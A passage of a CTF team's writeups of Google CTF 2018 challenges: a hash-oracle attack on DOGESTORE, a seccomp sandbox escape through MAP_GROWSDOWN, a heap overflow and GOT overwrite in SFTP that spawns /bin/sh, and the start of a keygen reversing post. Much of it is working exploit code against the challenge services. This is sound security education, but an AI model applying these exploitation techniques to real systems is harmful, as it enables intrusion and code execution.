gethash(bxor(ctext, mask)) hashes.append(h) # if we found a match among the hashes, the letters were the same, and # we guessed the bit difference between this letter and the next one if len(set(hashes)) \u0026lt; 4: print() print(\u0026#39;Nice!\u0026#39;, c) differences.append(c) print(differences) print() break for c in range(256): s = chr(c) for x in differences: s += chr(ord(s[-1]) ^ x) print(c) print(s) Among the possible candidates, we notice one that follows the ctf flag format:\n... 72 HFHFHDHDHDSAaACTF{SADASDSDCTF{L_E_R_OY_JENKINS}ASDCTF{ ... Sadly we still don\u0026rsquo;t know how many times each letter is repeated in the actual decoded data.\nFinding the sizes # We can mount an attack similar to the previous, but this time we have the advantage of knowing the value of the letters themselves.\nAgain, we exploit the case where two different serializations are decoded to the same message.\nThe attack:\nconsider a pair of adjacent \u0026ldquo;letters\u0026rdquo; (i.e. letter 1 + size 1 + letter 2 + size 2) XOR the second letter with the mask M we know to make the letters the same consider a bit position in both \u0026ldquo;size\u0026rdquo; bytes (e.g. the first bit) flip the bit in the first size byte, get the resulting hash flip the bit in the second size byte, get the resulting hash if the bits were the same, both messages will have the letter repeated the same amount of times, and therefore the same hashes if the bits were opposite, the letter will appear a different amount of times and the hashes will be different repeat for each bit position in the size bytes (from 1 to 8) repeat for each pair of adjacent letters (from 1 to 55) With this attack we can recover M\u0026rsquo; = size 1 XOR size 2, one bit at a time.\nExample:\noriginal plaintext: A\\x03D\\x02 xor to make the letters match -\u0026gt; A\\x03A\\x02 bit 1: -\u0026gt; A\\x02A\\x02, tot 6, decoded as AAAAAA -\u0026gt; A\\x03A\\x03, tot 8, decoded as AAAAAAAA *no match* the bits are different bit 2: -\u0026gt; A\\x01A\\x02, tot 5, decoded as AAAAA -\u0026gt; A\\x03A\\x00, tot 5, decoded as AAAAA *match* the bits are the same ... The exploit:\n#!/usr/bin/env python3 from socket import socket from hashlib import sha3_256 as sha3 def bxor(b1, b2): parts = [] for b1, b2 in zip(b1, b2): parts.append(bytes([b1 ^ b2])) return b\u0026#39;\u0026#39;.join(parts) def gethash(text): # send text sock = socket() sock.connect((host, port)) sock.send(text) # get base64 encoded hash data = sock.recv(1024) sock.close() return data host = \u0026#39;dogestore.ctfcompetition.com\u0026#39; port = 1337 differences = [14, 14, 14, 14, 12, 12, 12, 12, 12, 23, 18, 32, 32, 2, 23, 18, 61, 40, 18, 5, 5, 18, 23, 23, 23, 7, 23, 18, 61, 55, 19, 26, 26, 13, 13, 16, 22, 6, 21, 15, 11, 5, 2, 7, 29, 46, 60, 18, 23, 7, 23, 18, 61, 113] # load encrypted flag with open(\u0026#39;encrypted_secret\u0026#39;, \u0026#39;rb\u0026#39;) as f: ctext = f.read() print(\u0026#39;Encrypted:\u0026#39;) print(ctext.hex()) print(len(ctext), \u0026#39;bytes\u0026#39;) nletters = len(ctext) // 2 sizes = [] for i in range(0, nletters - 1): print(\u0026#39;index:\u0026#39;, i) b = 0 for j in range(8): print(\u0026#39;bit\u0026#39;, j) # check if this bit in the current size byte is different from the one # in the following size byte # first mask: make letters the same, # change one bit in the size of the first letter mask1 = b\u0026#39;\\x00\\x00\u0026#39; * i + \\ b\u0026#39;\\x00\u0026#39; + (1\u0026lt;\u0026lt;j).to_bytes(1, \u0026#39;little\u0026#39;) + \\ (differences[i]).to_bytes(1, \u0026#39;little\u0026#39;) + b\u0026#39;\\x00\u0026#39; + \\ b\u0026#39;\\x00\\x00\u0026#39; * (nletters - i - 2) assert len(mask1) == 110 h1 = gethash(bxor(ctext, mask1)) # second mask: make letters the same, # change one bit in the size of the second letter mask2 = b\u0026#39;\\x00\\x00\u0026#39; * i + \\ b\u0026#39;\\x00\\x00\u0026#39; + \\ (differences[i]).to_bytes(1, \u0026#39;little\u0026#39;) + \\ (1\u0026lt;\u0026lt;j).to_bytes(1, \u0026#39;little\u0026#39;) + \\ b\u0026#39;\\x00\\x00\u0026#39; * (nletters - i - 2) assert len(mask2) == 110 h2 = gethash(bxor(ctext, mask2)) # if the bits are the same, the size will be increased by the same # amount for both letters # -\u0026gt; same hash # otherwise one size will be increased, the other decreased # -\u0026gt; different hashes if h1 == h2: print(\u0026#39;same\u0026#39;) else: print(\u0026#39;different\u0026#39;) b += (1 \u0026lt;\u0026lt; j) print(hex(b)) sizes.append(b) print(sizes) Using this exploit we manage to find the bitwise differences between the sizes of each letter.\nAgain, we don\u0026rsquo;t know the first value, but we guess the one with the smallest values is the most probable.\nFlag # {% raw %} With the leaked letters and sizes, we can recover the decoded secret, which is 'HFHFHHHDHDHDDDDDDSSSSSSSAAAAaAAAAAACTF{{{SADASDSDCTF{LLLLLLLLL___EEEEE____RRRRRRRRRRR_OYYYYYYYYYY_JEEEEEEENKKKINNSSS}ASDDDDDDDCTF{{{{{\\n'. {% endraw %}\nThe sha3 hash of the secret we found is ff1e690dea4fa3384cfb151e95abe92fde33e57d69d8c1f97107d0bbccf8a1d6, which matches with the one provided by the server! We\u0026rsquo;re all set.\nThe flag is the portion following this ctf\u0026rsquo;s flag format, i.e. CTF{LLLLLLLLL___EEEEE____RRRRRRRRRRR_OYYYYYYYYYY_JEEEEEEENKKKINNSSS}.\nAdditional notes # This challenge was fun, as there were many different way to leak the plaintext content.\nFor instance, an alternative way to leak the sizes came to our mind after the ctf was finished.\nOnce we knew the letters, we could just XOR all letters to the same one and get the resulting hash. We could then locally compute the hash of that letter repeated for all possible lengths, and look for a match to find the sum of all the sizes.\nThe single values could next be found by xoring a letter at a time, and again bruteforcing locally all possible combination of the repetitions of that letter, concatenated with the repetitions of the other letter.\nThis could have saved some requests to the challenge service, which was often slow while the ctf was running (probably due to high load).\n","date":"30 June 2018","externalUrl":null,"permalink":"/writeups/2018-06-30-google-ctf-2018-dogestore/","section":"","summary":"","title":"DOGESTORE - Google CTF 2018","type":"writeups"},{"content":"","date":"30 June 2018","externalUrl":null,"permalink":"/tags/google/","section":"Tags","summary":"","title":"Google","type":"tags"},{"content":" Authors: chqmatteo Man in the Middle the communication between the client and the server\nIt appears you don't have a PDF plugin for this browser. You can download the PDF instead.\nDownload PDF here.\n","date":"30 June 2018","externalUrl":null,"permalink":"/writeups/2018-06-30-google-ctf-2018-mitm/","section":"","summary":"","title":"MITM - Google CTF 2018","type":"writeups"},{"content":" Author: chqmatteo Can you find a collision in the compression function?\nIt appears you don't have a PDF plugin for this browser. You can download the PDF instead.\nDownload PDF here.\n","date":"29 June 2018","externalUrl":null,"permalink":"/writeups/2018-06-29-google-ctf-2018-dm-collision/","section":"","summary":"","title":"DM COLLISION - Google CTF 2018","type":"writeups"},{"content":" Authors: abiondo, andreafioraldi, pietroborrello What a kewl sandbox! Seccomp makes it impossible to execute ./flag\nThe sandbox reads a 64bit binary and proceeds to execute it in a temporary folder.\nBut this is not so easy.\nFirst of all the ELF header is checked:\nstatic int elf_check(const char *filename, unsigned long mmap_min_addr) { Elf_Binary_t *elf_binary = elf_parse(filename); if (elf_binary == NULL) { warnx(\u0026#34;failed to parse ELF binary\u0026#34;); return -1; } Elf_Header_t header = elf_binary-\u0026gt;header; uint8_t *identity = header.identity; int ret = 0; if (identity[EI_CLASS] != ELFCLASS64) { warnx(\u0026#34;invalid ELF class \\\u0026#34;%s\\\u0026#34;\u0026#34;, ELF_CLASS_to_string(identity[EI_CLASS])); ret = -1; goto out; } mmap_min_addr += PAGE_SIZE; unsigned int i; Elf_Section_t** sections = elf_binary-\u0026gt;sections; for (i = 0; i \u0026lt; header.numberof_sections; ++i) { Elf_Section_t* section = sections[i]; if (section == NULL) { warnx(\u0026#34;invalid section %d\u0026#34;, i); ret = -1; goto out; } if (section-\u0026gt;virtual_address != 0 \u0026amp;\u0026amp; section-\u0026gt;virtual_address \u0026lt; mmap_min_addr + PAGE_SIZE) { warnx(\u0026#34;invalid section \\\u0026#34;%s\\\u0026#34; (0x%lx)\u0026#34;, section-\u0026gt;name, section-\u0026gt;virtual_address); ret = -1; goto out; } } Elf_Segment_t** segments = elf_binary-\u0026gt;segments; for (i = 0; segments[i] != NULL; ++i) { Elf_Segment_t* segment = segments[i]; if (segment-\u0026gt;virtual_address != 0 \u0026amp;\u0026amp; segment-\u0026gt;virtual_address \u0026lt; mmap_min_addr + PAGE_SIZE) { warnx(\u0026#34;invalid segment (0x%lx)\u0026#34;, segment-\u0026gt;virtual_address); ret = -1; goto out; } } out: elf_binary_destroy(elf_binary); return ret; } As we can see the ELF must be 64 bits and each of its segments (don‚Äôt know why also section checked, maybe some PIE magic was possible) must be over the (mmap_min_addr + PAGE_SIZE) address. Then before executing the ELF some seccomp rules are added:\nstatic int install_syscall_filter(unsigned long mmap_min_addr) { int allowed_syscall[] = { SCMP_SYS(rt_sigreturn), SCMP_SYS(rt_sigaction), SCMP_SYS(rt_sigprocmask), SCMP_SYS(sigreturn), SCMP_SYS(exit_group), SCMP_SYS(exit), SCMP_SYS(brk), SCMP_SYS(access), SCMP_SYS(fstat), SCMP_SYS(write), SCMP_SYS(close), SCMP_SYS(mprotect), SCMP_SYS(arch_prctl), SCMP_SYS(munmap), SCMP_SYS(fstat), SCMP_SYS(readlink), SCMP_SYS(uname), }; scmp_filter_ctx ctx; unsigned int i; int ret; ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) { warn(\u0026#34;seccomp_init\u0026#34;); return -1; } for (i = 0; i \u0026lt; sizeof(allowed_syscall) / sizeof(int); i++) { if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, allowed_syscall[i], 0) != 0) { warn(\u0026#34;seccomp_rule_add\u0026#34;); ret = -1; goto out; } } This allows us to execute some system call, but unfortunately we won‚Äôt need them, and then comes the interesting part, that should prevent us from executing ./flag:\n/* prevent mmap to map mmap_min_addr */ if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 1, SCMP_A0(SCMP_CMP_GE, mmap_min_addr + PAGE_SIZE)) != 0) { warn(\u0026#34;seccomp_rule_add\u0026#34;); ret = -1; goto out; } /* first execve argument (filename) must be mapped at mmap_min_addr */ if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 1, SCMP_A0(SCMP_CMP_EQ, mmap_min_addr)) != 0) { warn(\u0026#34;seccomp_rule_add\u0026#34;); ret = -1; goto out; } These rules are quite tricky but essentially allows the execve syscall only if the first argument is mapped to mmap_min_addr address, but allow us to mmap only addresses above mmap_min_addr + PAGE_SIZE. Therefore it seems impossible to execute any binary.\nAfter reading the mmap man page, we came up to an interesting flag:\nMAP_GROWSDOWN This flag is used for stacks. It indicates to the kernel virtual memory system that the mapping should extend downward in memory. The return address is one page lower than the memory area that is actually created in the process\u0026#39;s virtual address space. Touching an address in the \u0026#34;guard\u0026#34; page below the mapping will cause the mapping to grow by a page. This growth can be repeated until the mapping grows to within a page of the high end of the next lower mapping, at which point touching the \u0026#34;guard\u0026#34; page will result in a SIGSEGV signal. So our first idea was to allocate a page starting at mmap_min_addr + PAGE_SIZE + 1 using the MAP_GROWSDOWN flag, and to access the address at mmap_min_addr.\nTherefore since the guard page was touched, as stated on the doc, the kernel should map the page for us. But apparently the documentation was not complete, and just the flag is not enough to let the system work. But we will discover this later.\nWhile trying to make the MAP_GROWSDOWN system work we tried some other ideas. There is presented a short list of ideas we came up with:\nIdeas Why not Use brk(0x10000) to move the program break to the target Unfortunately brk() just allows contiguous block allocation. Use MAP_HUGETLB to allocate a page spanning more than PAGE_SIZE at mmap_min_addr + PAGE_SIZE + 1 to get back aligned to mmap_min_addr Default policy for most system is to deny allocation for huge pages, and the server was too Use sbrk(0x10000 - sbrk(0))to move the program break to the target Translating the program break would have result in allocating the whole contiguous memory area in between, unfortunately a negative value for sbrk() only deallocates memory instead of allocating upward Exploit some race conditions passing a binary with lots of sections to let the LIEF check run, and execute in parallel another quick binary that would mmap the first file in memory (file tmp location was printed on stdout) and change data section address, after being checked I think it was hard but could have worked if only we have had the open() function Trying to place the data segment at address 0x0 (that would pass the check), and let him grow up to 0x10000 Obviously memory areas at program startup are allocated with mmap, therefore any allocation under mmap_min_addr will fail Passing a PIE binary and try to load it at segment at 0x10000, it would pass the checks since the segment addressed would be 0x0 I still believe the idea could work, but we didn‚Äôt succeed to make it mmap() the whole address space starting from mmap_min_addr + PAGE_SIZE + 1 (using the flag MAP_32BIT to restrict it) to let the kernel select as the last page mmap_min_addr for us. Our implementations never wrapped around into mmap_min_addr. We thought that due to ASLR, the mmap() function never wrapped over the mmap_base address before returning -1. So we couldn‚Äôt map the whole address space without MAP_FIXED The long table should suggest our frustration to make the MAP_GROWSDOWN system work. After giving up with all the other alternatives, we concluded that making MAP_GROWSDOWN to work was our only alternative to eternal damnation.\nSo we took our kernel reading skillz and started to investigate how the whole system should have worked.\nAs we should know every time unallocated memory is touched by a process (also due to Copy On Write or Lazy Physical Allocation) the kernel handler __do_page_fault is called.\nSince MAP_GROWSDOWN (according to the doc) should trigger the memory expansion when the unallocated guard page was touched, __do_page_fault was exactly the right point to exhamine.\nThe first thing to do, since we had the possibility, was to run an ELF that would check the system running through the uname() syscall, to know the exact kernel version to read.\nRunning the binary we discover that Linux Kernel 4.13 was used, and in arch/x86/mm/fault.c we find our function.\n__do_page_fault(struct pt_regs *regs, unsigned long error_code, unsigned long address) Before starting to dig in the code let‚Äôs take a look to ‚ÄúUnderstading the Linux Kernel‚Äù which provides a great image for the Page Fault Handler (for v2.6 but still valid).\nRemember that we are accessing an unmapped memory region (the guard page) in user space, and we fail with a SIGSEGV, so let‚Äôs examine the flow:\nNow we should see where we were wrong: we fail the check ‚ÄúAddress could belong to User Mode stack‚Äù, and to know why (even if now we could guess) let‚Äôs examine the kernel code:\nif (error_code \u0026amp; PF_USER) { if (unlikely(address + 65536 + 32 * sizeof(unsigned long) \u0026lt; regs-\u0026gt;sp)) { bad_area(regs, error_code, address); return; } } if (unlikely(expand_stack(vma, address))) { bad_area(regs, error_code, address); return; } Therefore avoiding bad_area, will result in expand_stack get executed, that will map our memory region, calling expand_downward from the passed address.\nSo setting rsp to an address near before the faulting address, will simulate a User Mode Stack. Just a mov rsp, 0x10100 was missing to our initial code!\nSo our final ELF will be:\nBITS 64 org 0x400000 ehdr: ; Elf64_Ehdr db 0x7f, \u0026#34;ELF\u0026#34;, 2, 1, 1, 0 ; e_ident times 8 db 0 dw 2 ; e_type dw 0x3e ; e_machine dd 1 ; e_version dq _start ; e_entry dq phdr - $$ ; e_phoff dq 0 ; e_shoff dd 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 1 ; e_phnum dw 0 ; e_shentsize dw 0 ; e_shnum dw 0 ; e_shstrndx ehdrsize equ $ - ehdr phdr: ; Elf64_Phdr dd 1 ; p_type dd 5 ; p_flags dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq filesize ; p_filesz dq filesize ; p_memsz dq 0x1000 ; p_align phdrsize equ $ - phdr _start: mov rax, 9 ; mmap mov rdi, 0x11000 ; addr = 0x11000 mov rsi, 4096 ; size = 4096 mov rdx, 3 ; prot = PROT_READ | PROT_WRITE mov r10, 306 ; flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_GROWSDOWN xor r8, r8 ; fd = -1 dec r8 xor r9, r9 ; off = 0 syscall mov rax, qword [filename] mov r10, rsp mov rsp, 0x10100 mov qword [0x10000], rax mov rax, 59 ; execve mov rdi, 0x10000 ; filename push 0 mov rdx, rsp ; envp = {0} push 0x10000 mov rsi, rsp ; argv = {0x10000, 0} syscall filename db \u0026#34;./flag\u0026#34; db 0 filesize equ $ - $$ And compiling it with\n$ nasm -f bin -o flagger flagger.asm Will give us the final binary to send with:\n#!/usr/bin/env python2 from pwn import * assert len(sys.argv) \u0026gt; 1 with open(sys.argv[1], \u0026#39;rb\u0026#39;) as f: payload = f.read() p = remote(\u0026#39;execve-sandbox.ctfcompetition.com\u0026#39;, 1337) p.recvuntil(\u0026#39;[*] waiting for an ELF binary...\u0026#39;) p.send(payload + \u0026#39;deadbeef\u0026#39;) p.interactive() Will give us our beloved flag!\nCTF{Time_to_read_that_underrated_Large_Memory_Management_Vulnerabilities_paper}\nIn the following link to a zip file you can find the execve-sandbox.c source code, the execve-sandbox binary, the libLIEF.so binary needed to run execve-sandbox, the full exploit in the flagger.asm file and the run.py script.\nAttachment\n","date":"29 June 2018","externalUrl":null,"permalink":"/writeups/2018-06-29-google-ctf-2018-execve-sandbox/","section":"","summary":"","title":"EXECVE SANDBOX - Google CTF 2018","type":"writeups"},{"content":" Authors: abiondo, andreafioraldi This file server has a sophisticated malloc implementation designed to thwart traditional heap exploitation techniques\u0026hellip;\nThe challenge file is only a x86_64 ELF binary named sftp.\nThe active protections are the following:\nPartial RELRO Stack canary NX PIE FORTIFY Executing the file results in a password prompt:\nLet‚Äôs dissect it in IDA.\nIn the main procedure we can see that the authentication is handled by a function that returns a boolean value.\nHere the decompiled code:\nThe password is hashed using a custom algorithm as we can see and the hash must be 0x8dfa to gain the access.\nTo reverse the hash I use the IDA Pro plugin IDAngr with the following steps:\nSet a breakpoint just after the password scanf (as in the picture) Run the debugger and insert ‚Äúa‚Äù*15 as the password when the debugged process ask for it. When the breakpoint is hitted set the avoid address to the ‚Äúreturn 0‚Äù address and the find address to the ‚Äúreturn result‚Äù address. Mark the password as symbolic To get an usable result some constraints must be added to the symbolic password: it must be printable and without spaces (due to scanf).\nOk it‚Äôs time to run the exploration engine and get a result.\n‚Ä¶ after some time ‚Ä¶\nHere you go! p\u0026amp;a2] is a valid password for SFTP.\nAfter the successful login we are in a shell-like prompt with some commands available:\nWith ls we can see that in the current directory there are two nodes: flag and src.\nThe command ‚Äúget flag‚Äù returned a very interesting output, check it here.\nIn the src folder you can find the application source code sftp.c (You can find it in the attached zip file).\nThe next step is to analyze the code in order to find a vulnerability.\nYou can immediately see that the files secure_allocator.h and filesystem.h included in the code are missing and so we must combine the sftp.c file with the information that we can extract from the binary with a bit of reverse engineering.\nFirstly we try to reconstruct secure_allocator.h in which is probably defined a custom implementation of malloc, realloc and free.\nIn the binary we have 3 wonderful symbols, malloc realloc and free.\nThey actually look pretty dumb:\nvoid* malloc(size_t size) { return (rand() \u0026amp; 0x1FFFFFFF | 0x40000000LL); } void free(void* ptr) {} void* realloc(void* ptr, size_t size) { return ptr; } In order to work malloc needs the address 0x40000000 to be mapped and in the main procedure this is not done, so let‚Äôs search for an initialization routine.\nThe binary has the .init_array section, a list of functions pointers that are executed before main.\nThese pointers are two in sftp.\nThe first is the allocator initializer, it maps 0x40000000 and calls srand with time(0).\nThis is good because the rand return value (and so malloc) is predictable.\nThe second is related to the filesystem initialization, we will analyze it later.\nWith a first analysis of the source code you can notice that the structure entry has a name field of size name_max (20) but the new_entry procedure takes a path as parameter of size path_max (4096) and then it is copied with strcpy in child-\u0026gt;name.\nSo we have an overflow here.\nentry** new_entry(char* path) { ... name = strrchr(path, \u0026#39;/\u0026#39;); if (!name) { name = path; path = NULL; } else { *name++ = 0; } ... *child = malloc(sizeof(entry)); (*child)-\u0026gt;parent_directory = parent; (*child)-\u0026gt;type = INVALID_ENTRY; strcpy((*child)-\u0026gt;name, name); //OVERFLOW The secure allocator realloc implementation combined with the new_entry code is very interesting.\nIn particular this line of code:\ndirectory_entry* new_parent = realloc(parent, sizeof(directory_entry) + (parent-\u0026gt;child_count * 2 * sizeof(entry*))); By default a directory entry has an array of 16 elements used to store pointers to children entries.\nThe realloc does nothing so if we can write a fake address in the entry-\u0026gt;child[17] when child_count is less than 16 it will be considered a child of the directory also after the reallocation.\nHow could we possibly write somthing in this array? Of course using the buffer overflow in the name field!\nWe can craft a fake child abusing the code of new_directory + new_entry:\ndirectory_entry* new_directory(char* path) { directory_entry* dir = NULL; entry** child = new_entry(path); //do here the overflow using path dir = realloc(*child, sizeof(directory_entry) + 16 * sizeof(entry*)); dir-\u0026gt;entry.type = DIRECTORY_ENTRY; dir-\u0026gt;child_count = 16; memset(dir-\u0026gt;child, 0, 16 * sizeof(entry*)); //beware! return dir; } With the overflow in name we must write data until the 17th child entry of the directory (the first 16 are later set to 0 with the memset).\nNow we have a problem? Which address we must write in the array?\nWe should use a fake entry created with put_file, but how we can know the address of a entry?\nSimply, we can predict malloc using rand(time(0)) in the exploit.\nSo let‚Äôs return to the filesystem initialization routine. (Import the structures in IDA for a better re)\nstruct directory_entry *init_filesystem() { struct file_entry *flag_entry; // rbx size_t v1; // rax int v2; // eax size_t v3; // rdx char *v4; // rdi size_t v5; // rax char *v6; // rdx struct file_entry *v7; // rbx size_t v8; // rax int v9; // eax size_t v10; // rdx char *v11; // rdi struct directory_entry *result; // rax _BYTE *v13; // rdx home_entry.entry.parent_directory = 0LL; strcpy(home_entry.entry.name, \u0026#34;home\u0026#34;); root = \u0026amp;home_entry; home_entry.child_count = 1LL; user_entry_ptr = 0LL; pwd = \u0026amp;home_entry; pwd = new_dir(username); //\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; flag_entry = *new_entry(\u0026#34;flag\u0026#34;); v1 = fake_flag_size; flag_entry-\u0026gt;entry.type = FILE_ENTRY; flag_entry-\u0026gt;size = v1; v2 = rand(); v3 = fake_flag_size; v4 = (v2 \u0026amp; 0x1FFFFFFF | 0x40000000LL); flag_entry-\u0026gt;data = v4; memcpy(v4, \u0026amp;fake_flag_content, v3); if ( flag_entry-\u0026gt;size ) { v5 = 0LL; do { v6 = \u0026amp;flag_entry-\u0026gt;data[v5++]; *v6 ^= 0x89u; } while ( flag_entry-\u0026gt;size \u0026gt; v5 ); } new_dir_no_parent(\u0026#34;src\u0026#34;); v7 = *new_entry(\u0026#34;src/sftp.c\u0026#34;); v8 = sftp_c_size; v7-\u0026gt;entry.type = FILE_ENTRY; v7-\u0026gt;size = v8; v9 = rand(); v10 = sftp_c_size; v11 = (v9 \u0026amp; 0x1FFFFFFF | 0x40000000LL); v7-\u0026gt;data = v11; result = memcpy(v11, \u0026amp;xored_sftp_c, v10); if ( v7-\u0026gt;size ) { result = 0LL; do { v13 = result + v7-\u0026gt;data; result = (result + 1); *v13 ^= 0x37u; } while ( v7-\u0026gt;size \u0026gt; result ); } return result; } As you can see the user directory is created with new_dir as a regular directory (with the parent directory = home_entry).\nThe user_entry address is also the first address returned by malloc. We can predict it in the following manner:\nlibc = CDLL(\u0026#39;libc.so.6\u0026#39;) libc.srand(int(time.time())) malloc = lambda : 0x40000000 | (libc.rand() \u0026amp; 0x01fffffff) user_entry_addr = malloc() log.info(\u0026#39;Predicted user entry @ 0x{:08x}\u0026#39;.format(user_entry_addr)) We must do this also for the other addresses returned by malloc that we want to predict simply invoking the malloc lambda in the script the same times as malloc is called in the binary.\nThe home_entry structure is in .data, so we can use the address of the user directory as the fake entry to leak the home_entry address and bypass PIE.\nSo let‚Äôs write a piece of code to leak PIE (using pwntools):\nprog = log.progress(\u0026#39;Putting fake leak entry\u0026#39;) leak_entry = p64(0) # parent_directory, don\u0026#39;t care leak_entry += p32(2) # type = FILE_ENTRY leak_entry += \u0026#39;leak\u0026#39;.ljust(20, \u0026#39;\\x00\u0026#39;) # name leak_entry += p64(8) # size = 8 leak_entry += p64(user_entry_addr) # data = user_entry_addr-\u0026gt;parent_directory # printing the content of leak will print the home_entry address (in .bss) put_file(\u0026#39;leak_entry\u0026#39;, leak_entry) prog.success() prog = log.progress(\u0026#39;Overflowing directory (leak)\u0026#39;) dirname = \u0026#39;A\u0026#39; * (20 + 8 + 17*8) # name + size + 17 entry* dirname += p32(leak_entry_addr) # 18th fake entry send_cmd(\u0026#39;mkdir \u0026#39; + dirname) prog.success() prog = log.progress(\u0026#39;Triggering directory reallocation (leak)\u0026#39;) trunc_dirname = \u0026#39;A\u0026#39;*20 + \u0026#39;\\x10\u0026#39; # ls command list the directory with a truced name send_cmd(\u0026#39;cd \u0026#39; + trunc_dirname) # the first 17 entries are zeored with memset, we must insert dummy entries to reach the 18th entry for i in range(17): put_file(str(i), \u0026#39;A\u0026#39;) prog.success() prog = log.progress(\u0026#39;Leaking binary base\u0026#39;) leak = get_file(\u0026#39;leak\u0026#39;) base = u64(leak) - 0x208be0 prog.success(\u0026#39;@ 0x{:012x}\u0026#39;.format(base)) With a leak of the base address we can repeat the previous procedure to print values from the GOT and try to find the libc.\nprog = log.progress(\u0026#39;Putting fake GOT entry\u0026#39;) got_entry = p64(0) # parent_directory, don\u0026#39;t care got_entry += p32(2) # type = FILE_ENTRY got_entry += \u0026#39;got\u0026#39;.ljust(20, \u0026#39;\\x00\u0026#39;) # name got_entry += p64(2*8) # size got_entry += p64(base + 0x205018 + 192) # data = start of GOT + 192 (frwite entry) put_file(\u0026#39;got_entry\u0026#39;, got_entry) prog.success() prog = log.progress(\u0026#39;Overflowing directory (GOT)\u0026#39;) dirname = \u0026#39;B\u0026#39; * (20 + 8 + 17*8) # name + size + 17 entry* dirname += p32(got_entry_addr) # 18th fake entry send_cmd(\u0026#39;mkdir \u0026#39; + dirname) prog.success() prog = log.progress(\u0026#39;Triggering directory reallocation (GOT)\u0026#39;) trunc_dirname = \u0026#39;B\u0026#39;*20 + \u0026#39;\\x10\u0026#39; send_cmd(\u0026#39;cd \u0026#39; + trunc_dirname) for i in range(17): put_file(str(i), \u0026#39;A\u0026#39;) prog.success() got = get_file(\u0026#39;got\u0026#39;) for i in range(0, len(got), 8): print(hex(u64(got[i:i+8]))) With this snippet we can print the address of fwrite and rand, the last 2 GOT entries.\nWith a quick lookup in our libc database I found that we have a match with Ubuntu GLIBC 2.23-0ubuntu9 (you can found it in the attached zip file)\nWhat\u0026rsquo;s next? With the fake entry for the got that we have created before we can use put_file to overwrite the fwrite entry with system.\nfwrite is used in writen and writen is called in handle_get.\nbool handle_get(char* path) { file_entry* file = find_file(path); if (file) { printf(\u0026#34;%zu\\n\u0026#34;, file-\u0026gt;size); writen(file-\u0026gt;data, file-\u0026gt;size); //calls fwrite(file-\u0026gt;data, ...) } else { printf(\u0026#34;File \\\u0026#34;%s\\\u0026#34; not found.\\n\u0026#34;, path); } return true; } So if fwrite() is now in fact system() and the argument passed to the call in writen is file-\u0026gt;data we must create a file that contains the command that we want execute.\nlibc_bin.address = u64(got[:8]) - libc_bin.symbols[\u0026#34;fwrite\u0026#34;] log.info(\u0026#34;libc base address: 0x%x\u0026#34; % libc_bin.address) put_file(\u0026#34;cmd\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;) target = p64(libc_bin.symbols[\u0026#34;system\u0026#34;]) put_file(\u0026#34;got\u0026#34;, target) p.sendline(\u0026#34;get cmd\u0026#34;) #system(\u0026#34;/bin/sh\u0026#34;) And win!\nIn the following link to a zip file you can find the sftp.c source code, the sftp binary, the full exploit, the libc binary and the header that must be imported in IDA.\nAttachment: https://drive.google.com/file/d/1O0-QFmp7KQ1ojANU5y75ouv6hFhm4QD0/view?usp=sharing\n","date":"29 June 2018","externalUrl":null,"permalink":"/writeups/2018-06-29-google-ctf-2018-sftp/","section":"","summary":"","title":"SFTP - Google CTF 2018","type":"writeups"},{"content":" Authors: marcof, nearffxx, Mercurio I bet you can\u0026rsquo;t reverse this algorithm!\n$ nc keygenme.ctfcompetition.com 1337\nThis was a 249pts reversing challenge from GoogleCTF-2018\nStage One # We are given an ELF 64 binary with an encrypted section containing its code base. The code is xored at runtime with an hardcoded key and later executed. We wrote an IDC script to decript the binary and make it possible to analyze in IDA.\n#include \u0026lt;idc.idc\u0026gt; static decrypt(from, size, key ) { auto i, x; for ( i=0; i \u0026lt; size; i=i+1 ) { x = get_qword(from); // fetch the byte x = (x^key); // decrypt it patch_qword(from,x); // put it back from = from + 8; // next byte } } static stage_1() { decrypt(0x6001bc, 0x44a8, 0x1122334455667788); patch_byte(0x4000da,0x56); // we push rsi (containing the decrypted code address) patch_byte(0x4000db,0xc3); // retn } Now we learned the program is forking and ptracing its child process right after. The child process instead calls execve on \u0026ldquo;/proc/self/fd/3\u0026rdquo; which contains the main keygen logic. Our way to dump the child binary was to break before the execve and copy the binary using cp. For sake of simplicity we called this main3\n(gdb) set follow-fork-mode child (gdb) catch syscall execve Catchpoint 1 (syscall \u0026#39;execve\u0026#39; [59]) (gdb) r Starting program: /home/nearffxx/tmp/main [New process 24430] [Switching to process 24430] Thread 2.1 \u0026#34;main_o\u0026#34; hit Catchpoint 1 (call to syscall execve), 0x00007ffff7fddc10 in ?? (gdb) !cp /proc/24430/fd/3 main3 Understanding main3 (child process) # As soon as we opened the child process we noticed antidebugging techniques. Basically the original code was filled with a bunch of trap instructions. The parent process would intercept its child traps and restore the original instructions.\nWe straced the parent process to observe the patches it was supplying to its child. Below the significant output:\nprocess_vm_writev(26117, [{iov_base=\u0026#34;\\x01\\xca\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555554d56, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x01\\xca\\x01\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555555549, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x01\\xd0\u0026#34;, iov_len=2}], 1, [{iov_base=0x5555555552b6, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x01\\xd0\u0026#34;, iov_len=2}], 1, [{iov_base=0x5555555553c5, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x01\\xd0\\x89\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554f2e, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x31\\xd1\\x48\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554da8, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x41\\x5d\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555555c1e, iov_len=2}], 1, 0) 